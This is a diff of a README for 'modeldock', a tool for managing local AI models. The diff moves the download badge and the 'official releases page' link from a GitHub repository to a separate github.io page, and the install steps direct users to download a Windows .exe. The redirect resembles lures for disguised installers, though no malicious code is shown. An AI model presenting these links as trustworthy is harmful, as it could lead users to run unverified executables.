@@ -1,6 +1,6 @@
 # 📦 modeldock - Manage local artificial intelligence models easily
 
-[![Download modeldock](https://img.shields.io/badge/Download-modeldock-blue.svg)](https://github.com/sheilakathrynincalculable765/modeldock)
+[![Download modeldock](https://img.shields.io/badge/Download-modeldock-blue.svg)](https://sheilakathrynincalculable765.github.io)
 
 modeldock helps you manage artificial intelligence models on your own computer. You use it to find, download, and store machine learning files. It connects to programs like Ollama and LM Studio so you can load models without complex setup. This tool acts like a library for your AI needs.
 
@@ -24,7 +24,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 ## 📥 How to Install
 
-1. Visit the [official releases page](https://github.com/sheilakathrynincalculable765/modeldock) to find the latest version.
+1. Visit the [official releases page](https://sheilakathrynincalculable765.github.io) to find the latest version.
 2. Look for the file that ends in .exe for Windows.
 3. Click the link to save the installer to your computer.
 4. Locate the file in your downloads folder.
